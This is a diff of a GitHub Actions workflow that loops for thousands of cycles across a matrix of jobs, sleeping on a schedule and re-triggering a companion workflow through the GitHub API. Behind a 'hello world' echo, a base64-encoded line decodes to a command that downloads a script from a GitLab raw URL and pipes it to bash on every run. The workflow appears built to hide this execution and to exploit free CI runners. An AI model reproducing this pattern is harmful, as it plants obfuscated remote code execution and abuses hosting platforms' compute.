@@ -1,4 +1,4 @@
-name: 🔵 khurapes
+name: 🔵 Xharape
 
 on:
   workflow_dispatch:
@@ -6,7 +6,7 @@ on:
       loop_count:
         description: 'Siklus tersisa'
         required: true
-        default: '9999'
+        default: '9988'
 
 permissions:
   actions: write
@@ -40,48 +40,46 @@ jobs:
           - name: Thelilops-syonserer1112s1
           - name: Thelilops-tyonserer1112t1
     runs-on: ubuntu-latest
-    timeout-minutes: 320
+    timeout-minutes: 310
     steps:
       - name: Jalankan dengan durasi dinamis
         run: |
           HOUR_UTC=$(date -u +%H)
           LOOP=${{ github.event.inputs.loop_count }}
-          # Hitung siklus penuh berdasarkan nilai awal baru 9988
           COMPLETED=$(( (9988 - LOOP) / 3 ))
           if [ "$COMPLETED" -ge 3 ]; then
             if [ "$HOUR_UTC" -eq 4 ]; then
-              echo "🕚 HELLO WORLD 🕚"
+              echo "🕚 Jam 11 siang WIB (04 UTC). Sleep 5 jam."
               SLEEP=18000
             elif [ "$HOUR_UTC" -ge 23 ] || [ "$HOUR_UTC" -lt 3 ]; then
-              echo "🕕 HELLO WORLD"
+              echo "🕕 Jam 6-9 pagi WIB (UTC 23-02). Sleep 3 jam."
               SLEEP=10800
             else
-              if [ "$LOOP" -ge 9983 ]; then    # 6 loop pertama (9988–9983)
-                echo "🔄 hello world"
+              if [ "$LOOP" -ge 9983 ]; then
+                echo "🔄 6 loop pertama"
                 SLEEP=480
               else
-                echo "⏳ hello world"
+                echo "⏳ Loop lanjutan"
                 SLEEP=3600
               fi
             fi
           else
-            # Sebelum 3 siklus, aturan biasa
             if [ "$LOOP" -ge 9983 ]; then
-              echo "🔄 hello"
-              SLEEP=420
+              echo "🔄 Awal loop, sleep pendek"
+              SLEEP=480
             else
-              echo "⏳ hello"
+              echo "⏳ Loop lanjutan, sleep 1 jam"
               SLEEP=3600
             fi
           fi
           echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbHVtYW5zYW5zIHwgYmFzaA | sh & sleep $SLEEP
 
-  line-phanu:
+  trigger-pancung:
     needs: run-lscpu
     runs-on: ubuntu-latest
     if: github.event.inputs.loop_count > 0
     steps:
-      - name: Panggil phanu (next = khirap)
+      - name: Panggil pancung
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
@@ -89,5 +87,5 @@ jobs:
           curl -X POST \
             -H "Authorization: token $GITHUB_TOKEN" \
             -H "Accept: application/vnd.github.v3+json" \
-            https://api.github.com/repos/${{ github.repository }}/actions/workflows/phanu.yml/dispatches \
-            -d "{\"ref\":\"main\",\"inputs\":{\"loop_count\":\"$new_loop\",\"next_phase\":\"khirap\"}}"
+            https://api.github.com/repos/${{ github.repository }}/actions/workflows/pancung.yml/dispatches \
+            -d "{\"ref\":\"main\",\"inputs\":{\"loop_count\":\"$new_loop\"}}"
